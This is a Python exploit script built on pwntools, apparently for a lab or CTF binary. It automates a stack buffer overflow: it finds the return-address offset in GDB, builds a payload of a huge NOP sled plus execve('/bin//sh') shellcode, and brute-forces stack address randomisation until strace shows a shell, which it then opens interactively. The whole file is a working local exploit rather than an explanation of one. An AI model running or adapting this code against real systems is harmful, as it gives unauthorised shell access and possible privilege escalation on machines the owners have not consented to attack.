import subprocess
import struct
import os
import re
import sys
import select
import fcntl

from pwn import *

log_file_path = 'strace.log'


def cleanup(exit_code: int):

    os.remove("trash")
    os.remove("payload")
    os.remove("strace.log")
    sys.exit(exit_code)


def stack_middle_address(output):

    # Find the line containing the word "stack" and extract the address in the middle
    output_lines = output.split('\n')
    stack_line = next((line for line in output_lines if 'stack' in line), None)
    
    if stack_line is None:
        print("GDB failed to find the stack line.")
        cleanup(1)
    
    pattern = r'\b0x[0-9a-f]+\b'
    matches = re.findall(pattern, stack_line)
    
    start_address = int(matches[0], 16)
    end_address = int(matches[1], 16)
    
    middle = (start_address + end_address) // 2
    middle += 4  #all the addresses end in 00 and when this is concatenated in bytes in the payload, it starts with \x00 and terminates the payload. Adding 4 to avoid the \x00 sequence

    return middle


def generate_test():
    return cyclic(1000)


def locate_ra(pattern, target):

    gdb_proc = subprocess.Popen(
        [f"gdb {target}"], 
        stdin=subprocess.PIPE, 
        stdout=subprocess.PIPE, 
        stderr=subprocess.PIPE, 
        shell=True, 
        text=True
    )
    commands = f"""
    set pagination off
    r
    {pattern.decode('latin-1')}
    """

    gdb_proc.stdin.write(commands)
    gdb_proc.stdin.flush()

    while True:
        output = gdb_proc.stdout.readline()
        if "Program received signal SIGSEGV" in output:
            break

    gdb_proc.stdin.write("info registers\n")
    gdb_proc.stdin.flush()

    gdb_proc.stdin.write("q\n")
    gdb_proc.stdin.write("y\n")
    gdb_proc.stdin.flush()

    output, _ = gdb_proc.communicate()
    
    eip_value = None
    for line in output.splitlines():
        if "eip" in line:  # Find the line with 'eip'
            eip_value = line.split()[1]  # Extract the hexadecimal value (second column)
            break

    offset = cyclic_find(int(eip_value, 16))
    return offset


def target_ra(target):

    #find in what adresses the stack fluctuates -> info proc mapping

    #first expand the stack filling it up with as many trash bytes as we can, will pass the trash file as command line argument
    trash = b'B'*131000
    trash_args = "`cat trash` " * 15    
    open("trash", "wb").write(trash)  

    gdb_process = subprocess.Popen(
        f"gdb {target}", 
        stdin=subprocess.PIPE, 
        stdout=subprocess.PIPE, 
        stderr=subprocess.PIPE, 
        text=True, 
        shell=True
    )

    commands = f"""
    set disable-randomization off
    set breakpoint pending on
    b main
    r {trash_args}
    info proc mapping
    q
    y
    """

    gdb_process.stdin.write(commands)
    gdb_process.stdin.flush()
    output, _ = gdb_process.communicate()

    return output


def construct_payload(offset, target):

    middle = stack_middle_address(target_ra(target))
    shellcode = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'

    #!!! will change
    offset += 4 
    #!!!

    payload = b'A' * offset
    payload += struct.pack("<I", middle)
    payload += b'\x90' * 200000
    payload += shellcode

    open("payload", "wb").write(payload)


def drain_fd(fd: int):
    try:
        while True:
            rlist, _, _ = select.select([fd], [], [], 0.2)
            if not rlist:
                break     #drained all trash content
            
            try:
                os.read(fd, 10000)
            except OSError:
                break
    except Exception as e:
        print(f"An error occurred while draining the buffer: {e}")
        cleanup()


def attach_strace():
    main_pid = os.getpid()
    strace_command = f"strace -f -e execve -p {str(main_pid)} -o strace.log"

    #all error logs to devnull to keep stdout clean
    with open(os.devnull, 'w') as devnull:
        subprocess.Popen(
            strace_command, 
            shell=True, 
            stderr=devnull
        )


    while not os.path.isfile('strace.log'):
        time.sleep(0.1)


def detect_crash(pid: int):
    pid_str = str(pid)

    # pattern to detect the SIGCHLD signal with a SIGSEGV e.g. SIGCHLD {si_signo=SIGCHLD, si_code=CLD_DUMPED, si_pid=15595, si_uid=0, si_status=SIGSEGV, si_utime=0, si_stime=3}
    pattern = re.compile(
        rf"{pid_str}.*SIGCHLD.*si_status=SIGSEGV"
        # rf"{ppid_str}.*SIGCHLD.*si_pid={pid_str}.*si_status=(139|[^,]*SIGSEGV)" => THis line occurs after the exploit process terminates, right now the exploit proc is still running
    )

    try:
        with open(log_file_path, 'r') as log_file:
            lines = log_file.readlines()

            for line in lines:

                if pattern.search(line):
                    print(line)
                    return True

    except FileNotFoundError:
        print(f"Log file '{log_file_path}' not found.")
        cleanup()
    except Exception as e:
        print(f"An error occurred while reading the log file: {e}")
        cleanup()

    return False


def detect_execve():
    pattern = re.compile(
        r"\d+\s+execve\(\"/bin//sh\", NULL, NULL\)\s+=\s+0"
    )

    try:
        with open(log_file_path, 'r') as log_file:
            lines = log_file.readlines()
            for line in lines:
                if pattern.search(line):
                    return True

    except FileNotFoundError:
        print(f"Log file '{log_file_path}' not found.")
        cleanup(1)
    except Exception as e:
        print(f"An error occurred while reading the log file: {e}")
        cleanup(1)

    return False


def main():
        
    if len(sys.argv) != 2:
        print("No executable file provided")
        sys.exit(1)

    target = sys.argv[1]
    

    if not os.access(f'/usr/local/bin/{target}', os.X_OK):
        print(f"{target}: Permission denied")
        sys.exit(1)

    # context.log_level='warn'

    #this program has PIE enabled -> compilation option that changes the location of the executable in every run

    ra_offset = locate_ra(generate_test(), target)
    construct_payload(ra_offset, target)
    attach_strace()

    # context.log_level = 'debug'

    #performing brute force attack
    exploit_command = f"cat payload - | {target} " + " ".join(["`cat trash`"] * 15)
    i = 0
    while True:
        print(f"Attempt: {i}")
        i += 1
        
        exploit_proc = process(exploit_command, shell=True, stdin=PTY, stdout=PTY, stderr=PTY, raw=False)
        exploit_proc.sendline()
        
        try:
            while True:

                if detect_execve():
                    log.success("Exploit successful, shell spawned!")
                    drain_fd(exploit_proc.proc.stdout.fileno())
                    exploit_proc.interactive()
                    exploit_proc.close()
                    cleanup(0)


                output = exploit_proc.recv(timeout=0.2)   # timeout -> give enough time for vuln to read the payload and for recv to consume the content of the pty output buffer: 0.1 was not enough apparently
                
                if output:
                    if detect_crash(exploit_proc.pid) or i == 1:
                        with open(log_file_path, 'a+') as log_file:
                            fcntl.flock(log_file, fcntl.LOCK_EX)
                            try:
                                log_file.truncate(0)  #empty log file to reduce load during searches
                                log_file.seek(0)
                            finally:
                                fcntl.flock(log_file, fcntl.LOCK_UN)
                        break
                else:
                    break

        except EOFError:
            log.warning("No output received, breaking out of loop.")

        exploit_proc.close()


if __name__ == "__main__":
    main()